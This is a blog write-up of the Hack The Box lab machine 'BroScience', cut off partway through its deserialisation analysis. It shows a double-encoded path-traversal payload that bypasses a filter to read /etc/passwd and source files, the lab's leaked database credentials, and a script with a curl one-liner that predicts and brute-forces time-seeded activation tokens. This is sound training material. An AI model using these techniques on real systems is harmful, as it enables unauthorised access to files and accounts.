<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(HTB) - BroScience" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="BroScience is a Medium Difficulty Linux machine that features a web application vulnerable to LFI. Through the ability to read arbitrary files on the target, the attacker gains an insight into how account activation codes are generated, and is thus able to create a set of potentially valid tokens to activate a newly created account. Once logged in, further enumeration reveals that the site’s theme-picker functionality is vulnerable to PHP deserialisation using a custom gadget chain, allowing an attacker to copy files on the target system, eventually leading to remote code execution. Once a foothold has been established, a handful of hashes are recovered from a database, which once cracked prove to contain a valid SSH password for the machine’s main user bill. Finally, the privilege escalation is based on a cronjob executing a Bash script that is vulnerable to command injection through a certificate generated by openssl, forfeiting root access to the attacker." /><meta property="og:description" content="BroScience is a Medium Difficulty Linux machine that features a web application vulnerable to LFI. Through the ability to read arbitrary files on the target, the attacker gains an insight into how account activation codes are generated, and is thus able to create a set of potentially valid tokens to activate a newly created account. Once logged in, further enumeration reveals that the site’s theme-picker functionality is vulnerable to PHP deserialisation using a custom gadget chain, allowing an attacker to copy files on the target system, eventually leading to remote code execution. Once a foothold has been established, a handful of hashes are recovered from a database, which once cracked prove to contain a valid SSH password for the machine’s main user bill. Finally, the privilege escalation is based on a cronjob executing a Bash script that is vulnerable to command injection through a certificate generated by openssl, forfeiting root access to the attacker." /><link rel="canonical" href="https://an9k0r.github.io/posts/Broscience/" /><meta property="og:url" content="https://an9k0r.github.io/posts/Broscience/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-07-23T10:33:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(HTB) - BroScience" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"BroScience is a Medium Difficulty Linux machine that features a web application vulnerable to LFI. Through the ability to read arbitrary files on the target, the attacker gains an insight into how account activation codes are generated, and is thus able to create a set of potentially valid tokens to activate a newly created account. Once logged in, further enumeration reveals that the site’s theme-picker functionality is vulnerable to PHP deserialisation using a custom gadget chain, allowing an attacker to copy files on the target system, eventually leading to remote code execution. Once a foothold has been established, a handful of hashes are recovered from a database, which once cracked prove to contain a valid SSH password for the machine’s main user bill. Finally, the privilege escalation is based on a cronjob executing a Bash script that is vulnerable to command injection through a certificate generated by openssl, forfeiting root access to the attacker.","headline":"(HTB) - BroScience","dateModified":"2023-07-23T10:33:00+02:00","url":"https://an9k0r.github.io/posts/Broscience/","datePublished":"2023-07-23T10:33:00+02:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/Broscience/"},"@context":"https://schema.org"}</script><title>(HTB) - BroScience | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(HTB) - BroScience</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/658baea45d3cfe1b8c06fe223e8104782dea86ca461546a48d9b033c9ca6f7d9.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(HTB) - BroScience</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-07-23 10:33:00 +0200" data-toggle="tooltip" data-placement="bottom" title="Sun, Jul 23, 2023, 10:33 AM +0200" >Jul 23</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1965 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><strong>BroScience is a Medium Difficulty Linux machine that features a web application vulnerable to <code class="language-plaintext highlighter-rouge">LFI</code>. Through the ability to read arbitrary files on the target, the attacker gains an insight into how account activation codes are generated, and is thus able to create a set of potentially valid tokens to activate a newly created account. Once logged in, further enumeration reveals that the site’s theme-picker functionality is vulnerable to PHP deserialisation using a custom gadget chain, allowing an attacker to copy files on the target system, eventually leading to remote code execution. Once a foothold has been established, a handful of hashes are recovered from a database, which once cracked prove to contain a valid <code class="language-plaintext highlighter-rouge">SSH</code> password for the machine’s main user <code class="language-plaintext highlighter-rouge">bill</code>. Finally, the privilege escalation is based on a cronjob executing a Bash script that is vulnerable to command injection through a certificate generated by <code class="language-plaintext highlighter-rouge">openssl</code>, forfeiting <code class="language-plaintext highlighter-rouge">root</code> access to the attacker.</strong></p><h1 id="enumeration">Enumeration</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>Nmap scan report for 10.129.126.184
Host is up (0.067s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|_  256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
80/tcp  open  http     Apache httpd 2.4.54
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Did not follow redirect to https://broscience.htb/
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: BroScience : Home
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Not valid before: 2022-07-14T19:48:36
|_Not valid after:  2023-07-14T19:48:36
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>There are ports 22, 80 and 443 open. Let’s first check the application and mind the redirect!</p><h2 id="webserver">Webserver<a href="#webserver" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>First we need to add <code class="language-plaintext highlighter-rouge">broscience.htb</code> into <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><p><img data-src="/assets/images/2e0e9b147c86299420d2bfaed87b6e5cbf6e59c0d59bb45f4811c621824f643b.png" alt="picture 1" data-proofer-ignore></p><p>I’ll be running all requests through Burp!</p><p>On the first site, we can notice:</p><ul><li>login<li>usernames</ul><p>This pops right away, if we click a little bit around we’d find following path in Burp’s sitemap <code class="language-plaintext highlighter-rouge">img.php</code> which accepts <code class="language-plaintext highlighter-rouge">path=</code> parameter.</p><h1 id="initial-foothold">Initial Foothold</h1><h2 id="finding-local-file-inclusion-lfi">Finding Local File Inclusion (LFI)<a href="#finding-local-file-inclusion-lfi" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now if you’re thinking LFI, you’re probably right (or not?). If we enter <code class="language-plaintext highlighter-rouge">../</code> we’d get <code class="language-plaintext highlighter-rouge">Attack detected.</code> back so there is some kind of blacklist. If we encode once, we’d get blocked BUT if we encode <code class="language-plaintext highlighter-rouge">../</code> twice = <code class="language-plaintext highlighter-rouge">%252e%252e%252f</code> we’d bypass the filter.</p><p><img data-src="/assets/images/72d9df0f986a225a09cbe902f4467c779d1a7cc7997b7ddef608b5c51c6c103c.png" alt="picture 2" data-proofer-ignore></p><p>There is another filter on <code class="language-plaintext highlighter-rouge">/etc/passwd</code> but we can bypass that to!</p><p>Request: <code class="language-plaintext highlighter-rouge">/includes/img.php?path=c%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/test/%252e%252e%252f/passwd</code></p><p><img data-src="/assets/images/e0351c3e43930dcc6ce73088a6e410fe93e91bde51f0f1931927233d9ca3bdb5.png" alt="picture 3" data-proofer-ignore></p><p>We can read PHP files.</p><p><img data-src="/assets/images/f1e00446e1b043263cf05edf20ce8d8c91585d3a9a310b6f0532ad4a1fc7e730.png" alt="picture 4" data-proofer-ignore></p><p>If we check <code class="language-plaintext highlighter-rouge">/var/www/html/includes/img.php</code> we’ll see that file will get piped into <code class="language-plaintext highlighter-rouge">file_get_contents</code> (not like in exec or similar function which parses and executes the PHP)</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;b&gt;Error:&lt;/b&gt; Missing \'path\' parameter.'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Check for LFI attacks</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>

<span class="nv">$badwords</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span> <span class="s2">"etc/passwd"</span><span class="p">,</span> <span class="s2">".ssh"</span><span class="p">);</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$badwords</span> <span class="k">as</span> <span class="nv">$badword</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$badword</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">false</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">'&lt;b&gt;Error:&lt;/b&gt; Attack detected.'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Normalize path</span>
<span class="nv">$path</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>

<span class="c1">// Return the image</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: image/png'</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">'/var/www/html/images/'</span> <span class="mf">.</span> <span class="nv">$path</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>We can also find credentials for Postgre database using following request:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/includes/db_connect.php
############################
&lt;?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database");
}
?&gt;
</pre></table></code></div></div><p>Unfortunately password does not work anywhere so we have to search further.</p><p>We can read <code class="language-plaintext highlighter-rouge">activate.php</code> to see if we can somehow be able to guess/calculate activation code, which we need while <code class="language-plaintext highlighter-rouge">signup</code></p><p><img data-src="/assets/images/f5a42f62a63d6422aec83f11ca8ea56e38c9d9f1172acc0257ec39620af1dd46.png" alt="picture 5" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">includes/utils.php</code> get’s included in <code class="language-plaintext highlighter-rouge">register.php</code>.</p><p>Token is not implemented in safely manner.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">()</span> <span class="p">{</span>
    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
    <span class="nb">srand</span><span class="p">(</span><span class="nb">time</span><span class="p">());</span>
    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$activation_code</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can see that it calles seed <code class="language-plaintext highlighter-rouge">srand(time())</code> and <code class="language-plaintext highlighter-rouge">time()</code> is something that we can calculate, since response returns the time.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre># This oneliner takes date from response and sends requests using system time for translated time - 10 seconds = 10 requests.

php -f activation.php `php -r "echo strtotime('11 Jan 2023 07:43:42 GMT');"` | xargs -n1 -I{} -P1 bash -c "curl --proxy http://127.0.0.1:8080 -k https://broscience.htb/activate.php?code={} --silent | grep activated"
</pre></table></code></div></div><p>This is the script that i’ve used. First i used <code class="language-plaintext highlighter-rouge">strtotime</code> using date that was returned in response when account was created <code class="language-plaintext highlighter-rouge">register.php</code>. Then i echoed time() with that value for the last 10 seconds and piped it into xargs. I could’ve used Burps intruder instead</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">generate_activation_code</span><span class="p">(</span><span class="nv">$gen_time</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$chars</span> <span class="o">=</span> <span class="s2">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span><span class="p">;</span>
    <span class="nb">srand</span><span class="p">(</span><span class="nv">$gen_time</span><span class="p">);</span>
    <span class="nv">$activation_code</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$activation_code</span> <span class="o">=</span> <span class="nv">$activation_code</span> <span class="mf">.</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$activation_code</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$gen_time</span> <span class="o">=</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="c1">#echo "Using time from Arguments: ".$gen_time."\n";</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="nv">$gen_time</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
        <span class="c1">#echo "Using current time: ".$gen_time."\n";</span>
<span class="p">}</span>

<span class="k">for</span> <span class="p">(</span><span class="nv">$x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$x</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">;</span> <span class="nv">$x</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nf">generate_activation_code</span><span class="p">(</span><span class="nv">$gen_time</span><span class="o">-</span><span class="nv">$x</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>

<span class="p">}</span> 
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Activation was succesful!</p><p><img data-src="/assets/images/2b4d85d52eae5723a855ef770daff58947b972487797093031f4225b8b13899e.png" alt="picture 6" data-proofer-ignore></p><p>We can log in, but we only have only more option really, so let’s take a look into the code base (remember, we still use LFI to read the code!).</p><p><img data-src="/assets/images/fad057cdad969ca7a204f61119bdf75ded6e8a4c1d003cd26a4a4cfdc2f89123.png" alt="picture 7" data-proofer-ignore></p><p>If we check burp, we’d see GET request to <code class="language-plaintext highlighter-rouge">swap-theme.php</code>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">// Check if user is logged in already</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Swap the theme</span>
<span class="k">include_once</span> <span class="s2">"includes/utils.php"</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nf">get_theme</span><span class="p">(),</span> <span class="s2">"light"</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="nf">set_theme</span><span class="p">(</span><span class="s2">"dark"</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nf">set_theme</span><span class="p">(</span><span class="s2">"light"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// Redirect</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_REFERER'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: </span><span class="si">{</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_REFERER'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Code above calls <code class="language-plaintext highlighter-rouge">includes/utils.php</code> and its functions <code class="language-plaintext highlighter-rouge">get_theme()</code> and <code class="language-plaintext highlighter-rouge">set_theme()</code>. If we follow up on those functions, we’ll notice that cookie <code class="language-plaintext highlighter-rouge">user-prefs</code> is getting serialized. We could’ve noticed that if we’d check the value in the cookie <code class="language-plaintext highlighter-rouge">user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7fQ%3D%3D</code> ==&gt; <code class="language-plaintext highlighter-rouge">user-prefs=O:9:"UserPrefs":1:{s:5:"theme";s:4:"dark";}</code></p><p>Below the code:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="mf">...</span>
<span class="kd">class</span> <span class="nc">UserPrefs</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$theme</span><span class="p">;</span>

